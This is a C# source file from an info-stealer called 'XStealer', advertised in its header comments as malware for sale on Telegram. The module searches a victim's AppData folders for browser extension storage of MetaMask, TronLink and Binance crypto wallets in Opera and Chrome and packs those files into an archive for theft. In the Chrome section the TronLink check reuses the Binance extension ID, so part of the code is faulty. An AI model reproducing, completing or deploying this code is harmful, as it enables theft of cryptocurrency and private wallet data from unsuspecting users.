// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Wallets
{
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class ExtensionWallets
    {
        private static readonly HashSet<int> CounterData = new HashSet<int>();
        // Пути от который начинаем сканировать файлы
        private static readonly string[] dirs = new string[] { GlobalPaths.AppData, GlobalPaths.LocalAppData };

        public static void Inizialize()
        {
            try
            {
                foreach (string Mic in dirs.SelectMany(data => SafeScan.GetStackFiles(data, "*").Where(Mic => Mic.Contains("Local Extension Settings"))).Where(Mic => File.Exists(Mic)))
                {
                    // Получаем имя браузера
                    string FindBrowserPath = Mic.Split('\\')[5];

                    #region Opera Extension
                    if (FindBrowserPath.Contains("Opera"))
                    {
                        if (Mic.Contains("nkbihfbeogaeaoehlefnkodbefgpgknn")) // Metamask
                        {
                            CounterData.Add(1);
                            ZipEx.AddKeyPairStream($"CryptoWallets/ExtensionWallets/{FindBrowserPath}_MetaMask/{Path.GetFileName(Mic)}", ConverterEx.ToBytes(false, Mic));
                        }
                        if (Mic.Contains("ibnejdfjmmkpcnlpebklmnkoeoihofec")) // TronLink
                        {
                            CounterData.Add(2);
                            ZipEx.AddKeyPairStream($"CryptoWallets/ExtensionWallets/{FindBrowserPath}_TronLink/{Path.GetFileName(Mic)}", ConverterEx.ToBytes(false, Mic));
                        }
                        if (Mic.Contains("fhbohimaelbohpjbbldcngcnapndodjp")) // Binance
                        {
                            CounterData.Add(3);
                            ZipEx.AddKeyPairStream($"CryptoWallets/ExtensionWallets/{FindBrowserPath}_Binance/{Path.GetFileName(Mic)}", ConverterEx.ToBytes(false, Mic));
                        }
                    }
                    #endregion

                    #region Chromium Extension
                    if (FindBrowserPath.Contains("Google"))
                    {
                        if (Mic.Contains("nkbihfbeogaeaoehlefnkodbefgpgknn")) // Metamask
                        {
                            CounterData.Add(4);
                            ZipEx.AddKeyPairStream($"CryptoWallets/ExtensionWallets/{FindBrowserPath}_MetaMask/{Path.GetFileName(Mic)}", ConverterEx.ToBytes(false, Mic));
                        }
                        if (Mic.Contains("fhbohimaelbohpjbbldcngcnapndodjp")) // TronLink
                        {
                            CounterData.Add(5);
                            ZipEx.AddKeyPairStream($"CryptoWallets/ExtensionWallets/{FindBrowserPath}_TronLink/{Path.GetFileName(Mic)}", ConverterEx.ToBytes(false, Mic));
                        }
                        if (Mic.Contains("fhbohimaelbohpjbbldcngcnapndodjp")) // Binance
                        {
                            CounterData.Add(6);
                            ZipEx.AddKeyPairStream($"CryptoWallets/ExtensionWallets/{FindBrowserPath}_Binance/{Path.GetFileName(Mic)}", ConverterEx.ToBytes(false, Mic));
                        }
                    }
                    #endregion
                }
                // Добавляем счётчик кошелей к общему счётчику
                CounterEx.Wallets += CounterData.Count;
            }
            catch { }
        }
    }
}